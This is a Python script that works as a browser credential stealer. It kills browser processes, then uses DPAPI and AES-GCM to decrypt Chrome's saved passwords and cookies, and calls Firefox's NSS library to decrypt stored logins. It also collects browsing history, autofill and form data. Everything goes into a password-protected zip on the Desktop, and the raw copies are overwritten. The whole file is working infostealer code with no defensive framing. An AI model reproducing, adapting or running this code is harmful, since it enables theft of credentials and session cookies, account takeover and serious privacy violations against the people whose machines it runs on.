import os
import json
import sqlite3
import shutil
import base64
import time
import random
import tempfile
import psutil
import pyzipper
import ctypes
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from datetime import datetime

# === CONFIGURATION === #
CONFIG = {
    "FIREFOX": {
        "NSS_DLL": "nss3.dll",
        "INSTALL_PATH": r"C:\Program Files\Mozilla Firefox"
    },
    "SECURITY": {
        "ZIP_PASSWORD": "infected_secure_pass_123!",
        "MIN_DELAY": 2,
        "MAX_DELAY": 5
    },
    "OUTPUT": {
        "BASE_DIR": os.path.join(os.environ['USERPROFILE'], 'Desktop'),
        "KEEP_RAW_DATA": False
    }
}

# === UTILITIES === #
def random_delay():
    time.sleep(random.randint(CONFIG["SECURITY"]["MIN_DELAY"], 
              CONFIG["SECURITY"]["MAX_DELAY"]))

def kill_chrome_processes():
    targets = ['chrome.exe', 'msedge.exe', 'brave.exe']
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() in targets:
            try:
                proc.kill()
            except:
                pass

def secure_delete(path):
    try:
        if os.path.isfile(path):
            with open(path, 'ba+') as f:
                length = f.tell()
                f.seek(0)
                f.write(os.urandom(length))
            os.remove(path)
        elif os.path.isdir(path):
            shutil.rmtree(path)
    except:
        pass

# === CHROME DATA EXTRACTOR === #
class ChromeExtractor:
    def __init__(self):
        self.master_key = self._get_master_key()
        self.profile_path = os.path.join(
            os.environ["LOCALAPPDATA"],
            r"Google\Chrome\User Data\Default"
        )

    def _get_master_key(self):
        local_state_path = os.path.join(
            os.environ["LOCALAPPDATA"],
            r"Google\Chrome\User Data\Local State"
        )
        with open(local_state_path, "r", encoding="utf-8") as f:
            encrypted_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
            return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    def _decrypt(self, data):
        try:
            iv = data[3:15]
            payload = data[15:]
            cipher = AES.new(self.master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except:
            return None

    def _query_db(self, db_path, query):
        temp_db = os.path.join(tempfile.gettempdir(), f"tmp_db_{random.randint(1000,9999)}.db")
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute(query)
            return cursor.fetchall()
        except Exception as e:
            print(f"Database error: {e}")
            return []
        finally:
            if 'conn' in locals(): conn.close()
            if os.path.exists(temp_db): secure_delete(temp_db)

    def extract_all(self):
        data = {}
        
        # Passwords
        db_path = os.path.join(self.profile_path, "Login Data")
        query = "SELECT origin_url, username_value, password_value FROM logins"
        data['passwords'] = [{
            "url": row[0],
            "username": row[1],
            "password": self._decrypt(row[2])
        } for row in self._query_db(db_path, query) if row[2]]

        # Cookies
        db_path = os.path.join(self.profile_path, "Network", "Cookies")
        query = """
            SELECT host_key, name, encrypted_value, path, expires_utc, 
                   is_secure, is_httponly
            FROM cookies
        """
        data['cookies'] = [{
            "name": row[1],
            "value": self._decrypt(row[2]),
            "domain": row[0],
            "hostOnly": not row[0].startswith('.'),
            "path": row[3],
            "secure": bool(row[5]),
            "httpOnly": bool(row[6]),
            "sameSite": "no_restriction",
            "session": row[4] == 0,
            "expirationDate": row[4],
            "storeId": "0"
        } for row in self._query_db(db_path, query) if row[2]]

        # History
        db_path = os.path.join(self.profile_path, "History")
        query = """
            SELECT url, title, visit_count, last_visit_time 
            FROM urls ORDER BY last_visit_time DESC LIMIT 1000
        """
        data['history'] = [{
            "url": row[0],
            "title": row[1],
            "visit_count": row[2],
            "last_visit": row[3]
        } for row in self._query_db(db_path, query)]

        # Autofill
        db_path = os.path.join(self.profile_path, "Web Data")
        query = "SELECT name, value FROM autofill"
        data['autofill'] = [{
            "field": row[0],
            "value": row[1]
        } for row in self._query_db(db_path, query)]

        return data

# === FIREFOX DATA EXTRACTOR === #
class FirefoxExtractor:
    def __init__(self):
        self.nss = self._init_nss()
        self.profiles = self._find_profiles()

    def _init_nss(self):
        try:
            os.environ['PATH'] = CONFIG["FIREFOX"]["INSTALL_PATH"] + os.pathsep + os.environ['PATH']
            nss = ctypes.CDLL(os.path.join(CONFIG["FIREFOX"]["INSTALL_PATH"], CONFIG["FIREFOX"]["NSS_DLL"]))
            
            class SECItem(ctypes.Structure):
                _fields_ = [
                    ('type', ctypes.c_uint),
                    ('data', ctypes.c_char_p),
                    ('len', ctypes.c_uint)
                ]
            
            nss.NSS_Init.argtypes = [ctypes.c_char_p]
            nss.PK11SDR_Decrypt.argtypes = [ctypes.POINTER(SECItem), ctypes.POINTER(SECItem), ctypes.c_void_p]
            nss.SECITEM_ZfreeItem.argtypes = [ctypes.POINTER(SECItem), ctypes.c_int]
            
            self.SECItem = SECItem
            return nss
        except Exception as e:
            print(f"Failed to initialize NSS: {e}")
            return None

    def _find_profiles(self):
        profiles = []
        profiles_dir = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
        
        if os.path.exists(profiles_dir):
            for folder in os.listdir(profiles_dir):
                profile_path = os.path.join(profiles_dir, folder)
                if os.path.isdir(profile_path):
                    profiles.append({
                        'name': folder,
                        'path': profile_path,
                        'files': {
                            'logins': os.path.join(profile_path, 'logins.json'),
                            'cookies': os.path.join(profile_path, 'cookies.sqlite'),
                            'places': os.path.join(profile_path, 'places.sqlite'),
                            'forms': os.path.join(profile_path, 'formhistory.sqlite')
                        }
                    })
        return profiles

    def _decrypt_data(self, encrypted_data):
        try:
            encrypted_bytes = base64.b64decode(encrypted_data)
            input_item = self.SECItem(0, encrypted_bytes, len(encrypted_bytes))
            output_item = self.SECItem(0, None, 0)

            if self.nss.PK11SDR_Decrypt(ctypes.byref(input_item), ctypes.byref(output_item), None) == 0:
                decrypted = ctypes.string_at(output_item.data, output_item.len).decode('utf-8')
                self.nss.SECITEM_ZfreeItem(ctypes.byref(output_item), 0)
                return decrypted
            return None
        except Exception as e:
            print(f"Decryption failed: {e}")
            return None

    def extract_profile_data(self, profile):
        data = {}
        
        # Initialize NSS for this profile
        profile_path_bytes = f"sql:{profile['path']}".encode('utf-8')
        if self.nss.NSS_Init(profile_path_bytes) != 0:
            return None
        
        # Logins
        if os.path.exists(profile['files']['logins']):
            try:
                with open(profile['files']['logins'], 'r', encoding='utf-8') as f:
                    logins_data = json.load(f).get('logins', [])
                    data['logins'] = [{
                        'url': x.get('hostname'),
                        'username': self._decrypt_data(x.get('encryptedUsername')),
                        'password': self._decrypt_data(x.get('encryptedPassword'))
                    } for x in logins_data]
            except Exception as e:
                print(f"Error reading logins: {e}")
                data['logins'] = []

        # Cookies - Firefox format
        if os.path.exists(profile['files']['cookies']):
            try:
                conn = sqlite3.connect(profile['files']['cookies'])
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT name, value, host, path, expiry, isSecure, isHttpOnly, sameSite
                    FROM moz_cookies
                """)
                
                same_site_map = {
                    0: "no_restriction",
                    1: "lax",
                    2: "strict"
                }
                
                data['cookies'] = [{
                    "name": row[0],
                    "value": row[1],
                    "domain": row[2],
                    "hostOnly": not row[2].startswith('.'),
                    "path": row[3],
                    "secure": bool(row[5]),
                    "httpOnly": bool(row[6]),
                    "sameSite": same_site_map.get(row[7], "no_restriction"),
                    "session": row[4] == 0,
                    "expirationDate": row[4],
                    "storeId": "0"
                } for row in cursor.fetchall()]
                conn.close()
            except Exception as e:
                print(f"Error reading cookies: {e}")
                data['cookies'] = []

        # History
        if os.path.exists(profile['files']['places']):
            try:
                conn = sqlite3.connect(profile['files']['places'])
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT url, title, visit_count, last_visit_date
                    FROM moz_places
                    WHERE last_visit_date IS NOT NULL
                    ORDER BY last_visit_date DESC
                    LIMIT 1000
                """)
                data['history'] = [{
                    'url': row[0],
                    'title': row[1],
                    'visits': row[2],
                    'last_visit': row[3]
                } for row in cursor.fetchall()]
                conn.close()
            except Exception as e:
                print(f"Error reading history: {e}")
                data['history'] = []

        # Form History
        if os.path.exists(profile['files']['forms']):
            try:
                conn = sqlite3.connect(profile['files']['forms'])
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT fieldname, value, timesUsed, firstUsed, lastUsed
                    FROM moz_formhistory
                    ORDER BY lastUsed DESC
                """)
                data['form_history'] = [{
                    'field': row[0],
                    'value': row[1],
                    'times_used': row[2],
                    'first_used': row[3],
                    'last_used': row[4]
                } for row in cursor.fetchall()]
                conn.close()
            except Exception as e:
                print(f"Error reading form history: {e}")
                data['form_history'] = []

        self.nss.NSS_Shutdown()
        return data

# === DATA SAVER === #
class DataSaver:
    @staticmethod
    def save_to_files(base_dir, data):
        try:
            # System Info
            os.makedirs(base_dir, exist_ok=True)
            with open(os.path.join(base_dir, "system_info.json"), 'w', encoding='utf-8') as f:
                json.dump({
                    "timestamp": datetime.now().isoformat(),
                    "username": os.getlogin(),
                    "hostname": os.environ.get('COMPUTERNAME', 'unknown')
                }, f, indent=2, ensure_ascii=False)

            # Chrome Data
            chrome_dir = os.path.join(base_dir, "Chrome")
            os.makedirs(chrome_dir, exist_ok=True)
            for data_type, content in data['chrome'].items():
                with open(os.path.join(chrome_dir, f"{data_type}.json"), 'w', encoding='utf-8') as f:
                    json.dump(content, f, indent=2, ensure_ascii=False)

            # Firefox Data
            if data['firefox']:
                firefox_dir = os.path.join(base_dir, "Firefox")
                os.makedirs(firefox_dir, exist_ok=True)
                for profile_name, profile_data in data['firefox'].items():
                    profile_dir = os.path.join(firefox_dir, profile_name)
                    os.makedirs(profile_dir, exist_ok=True)
                    for data_type, content in profile_data.items():
                        with open(os.path.join(profile_dir, f"{data_type}.json"), 'w', encoding='utf-8') as f:
                            json.dump(content, f, indent=2, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"Error saving files: {e}")
            return False

    @staticmethod
    def create_zip(source_dir):
        zip_path = os.path.join(source_dir, "BrowserData.zip")
        try:
            with pyzipper.AESZipFile(zip_path, 'w', encryption=pyzipper.WZ_AES) as zf:
                zf.setpassword(CONFIG["SECURITY"]["ZIP_PASSWORD"].encode())
                for root, dirs, files in os.walk(source_dir):
                    for file in files:
                        if file != "BrowserData.zip":  # Skip the zip itself
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, start=source_dir)
                            zf.write(file_path, arcname)
            return zip_path
        except Exception as e:
            print(f"Error creating ZIP: {e}")
            return None

# === MAIN EXECUTION === #
def main():
    # Initial setup
    random_delay()
    kill_chrome_processes()
    random_delay()

    # Prepare output
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = os.path.join(CONFIG["OUTPUT"]["BASE_DIR"], f"BrowserData_{timestamp}")

    # Collect data
    collected_data = {
        "chrome": {},
        "firefox": {}
    }

    # Extract Chrome data
    try:
        chrome = ChromeExtractor()
        collected_data["chrome"] = chrome.extract_all()
    except Exception as e:
        print(f"Chrome extraction failed: {e}")
        collected_data["chrome_error"] = str(e)

    # Extract Firefox data
    firefox = FirefoxExtractor()
    if firefox.nss:
        for profile in firefox.profiles:
            try:
                profile_data = firefox.extract_profile_data(profile)
                if profile_data:
                    collected_data["firefox"][profile['name']] = profile_data
            except Exception as e:
                print(f"Firefox profile {profile['name']} failed: {e}")
                collected_data.setdefault("firefox_errors", {})[profile['name']] = str(e)

    # Save data
    if not DataSaver.save_to_files(output_dir, collected_data):
        print("Failed to save data files")
        return

    # Create ZIP in same folder
    zip_path = DataSaver.create_zip(output_dir)
    if not zip_path:
        print("Failed to create ZIP archive")
        return

    print(f"Data successfully saved to: {zip_path}")
    print(f"ZIP Password: {CONFIG['SECURITY']['ZIP_PASSWORD']}")

    # Cleanup
    if not CONFIG["OUTPUT"]["KEEP_RAW_DATA"]:
        for root, dirs, files in os.walk(output_dir):
            for file in files:
                if file != "BrowserData.zip":
                    secure_delete(os.path.join(root, file))

if __name__ == "__main__":
    main()